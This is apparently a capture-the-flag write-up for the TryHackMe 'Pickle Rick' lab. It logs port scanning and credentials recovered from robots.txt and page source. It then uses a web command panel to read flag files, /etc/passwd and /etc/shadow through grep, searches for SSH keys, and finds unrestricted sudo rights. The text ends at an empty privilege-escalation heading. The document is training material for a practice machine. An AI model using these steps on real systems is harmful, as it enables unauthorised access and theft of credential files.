https://tryhackme.com/room/picklerick

## scan

```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-31 08:23 EDT
Nmap scan report for 10.10.222.173
Host is up (0.36s latency).
Not shown: 813 closed ports, 185 filtered ports
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 7.59 seconds
```

gobuster found
```
/assets/
/index.html (Status: 200)
/login.php (Status: 200)

```


## access

robots.txt

```
Wubbalubbadubdub
```

inspect source of homepage
```
<!--

    Note to self, remember username!

    Username: R1ckRul3s

  -->
```

login to http://10.10.161.86/login.php with
```
R1ckRul3s:Wubbalubbadubdub
```

run ls command
```
Sup3rS3cretPickl3Ingred.txt
assets
clue.txt
denied.php
index.html
login.php
portal.php
robots.txt
```

the cat command is disabled 

so we modify grep to match everything to read from 
```
grep .* clue.txt
clue.txt:Look around the file system for the other ingredient.
```

```
grep .* Sup3rS3cretPickl3Ingred.txt
Sup3rS3cretPickl3Ingred.txt:mr. meeseek hair
```

we got the first flag

read the passwd file using the same method

```
/etc/passwd:root:x:0:0:root:/root:/bin/bash
/etc/passwd:daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
/etc/passwd:bin:x:2:2:bin:/bin:/usr/sbin/nologin
/etc/passwd:sys:x:3:3:sys:/dev:/usr/sbin/nologin
/etc/passwd:sync:x:4:65534:sync:/bin:/bin/sync
/etc/passwd:games:x:5:60:games:/usr/games:/usr/sbin/nologin
/etc/passwd:man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
/etc/passwd:lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
/etc/passwd:mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
/etc/passwd:news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
/etc/passwd:uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
/etc/passwd:proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
/etc/passwd:www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
/etc/passwd:backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
/etc/passwd:list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
/etc/passwd:irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
/etc/passwd:gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
/etc/passwd:nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
/etc/passwd:systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
/etc/passwd:systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
/etc/passwd:systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
/etc/passwd:systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
/etc/passwd:syslog:x:104:108::/home/syslog:/bin/false
/etc/passwd:_apt:x:105:65534::/nonexistent:/bin/false
/etc/passwd:lxd:x:106:65534::/var/lib/lxd/:/bin/false
/etc/passwd:messagebus:x:107:111::/var/run/dbus:/bin/false
/etc/passwd:uuidd:x:108:112::/run/uuidd:/bin/false
/etc/passwd:dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
/etc/passwd:sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
/etc/passwd:pollinate:x:111:1::/var/cache/pollinate:/bin/false
/etc/passwd:ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
```
view page source of /portal.php
```
<!-- Vm1wR1UxTnRWa2RUV0d4VFlrZFNjRlV3V2t0alJsWnlWbXQwVkUxV1duaFZNakExVkcxS1NHVkliRmhoTVhCb1ZsWmFWMVpWTVVWaGVqQT0== -->
```
decode this many times with base64, got the text

```
rabbit hole
```

found the rsa key 

```
find / -name *rsa*

/etc/ssh/ssh_host_rsa_key
/etc/ssh/ssh_host_rsa_key.pub

/etc/ssh/ssh_host_rsa_key.pub:ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDdP02ZxAzTiLT5mt+Tm02eJA12GXNRdBWYmSrJp5HttYx8Jr2oSr5xXCQDAUkYKd1wUAaxVgAIOqMBgy9aiY7G+EmNKPA7dxg45WubLlTGefZ7XJHLAjW6r2sGdQvuPRPnw/7ZshgtKXdfR3chCo6XJu6ZFvxLLrlixLDjy5iTn8oQ79BPe4M5vBkHMUCAUPMdctAPbIOzzeiBVVYv2LQtO2h82gYUB4Fwt8tMn6ZCTlSKDq6iDhxt9t32GPCuVbltEWEbJ4OAVdBQEoBf27yZblDJtpjXlMmy8/5AB/TuJH8DowzESRZK26iTmkxcjrfYItPPme8F33y2Xc3SENY/ root@ip-10-10-240-102
```

sudo -l
```
Matching Defaults entries for www-data on ip-10-10-240-102.eu-west-1.compute.internal:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ip-10-10-240-102.eu-west-1.compute.internal:
    (ALL) NOPASSWD: ALL
    ```
```
/etc/shadow:root:*:17849:0:99999:7:::
/etc/shadow:daemon:*:17849:0:99999:7:::
/etc/shadow:bin:*:17849:0:99999:7:::
/etc/shadow:sys:*:17849:0:99999:7:::
/etc/shadow:sync:*:17849:0:99999:7:::
/etc/shadow:games:*:17849:0:99999:7:::
/etc/shadow:man:*:17849:0:99999:7:::
/etc/shadow:lp:*:17849:0:99999:7:::
/etc/shadow:mail:*:17849:0:99999:7:::
/etc/shadow:news:*:17849:0:99999:7:::
/etc/shadow:uucp:*:17849:0:99999:7:::
/etc/shadow:proxy:*:17849:0:99999:7:::
/etc/shadow:www-data:*:17849:0:99999:7:::
/etc/shadow:backup:*:17849:0:99999:7:::
/etc/shadow:list:*:17849:0:99999:7:::
/etc/shadow:irc:*:17849:0:99999:7:::
/etc/shadow:gnats:*:17849:0:99999:7:::
/etc/shadow:nobody:*:17849:0:99999:7:::
/etc/shadow:systemd-timesync:*:17849:0:99999:7:::
/etc/shadow:systemd-network:*:17849:0:99999:7:::
/etc/shadow:systemd-resolve:*:17849:0:99999:7:::
/etc/shadow:systemd-bus-proxy:*:17849:0:99999:7:::
/etc/shadow:syslog:*:17849:0:99999:7:::
/etc/shadow:_apt:*:17849:0:99999:7:::
/etc/shadow:lxd:*:17849:0:99999:7:::
/etc/shadow:messagebus:*:17849:0:99999:7:::
/etc/shadow:uuidd:*:17849:0:99999:7:::
/etc/shadow:dnsmasq:*:17849:0:99999:7:::
/etc/shadow:sshd:*:17849:0:99999:7:::
/etc/shadow:pollinate:*:17849:0:99999:7:::
/etc/shadow:ubuntu:!:17937:0:99999:7:::
```

## priv esc
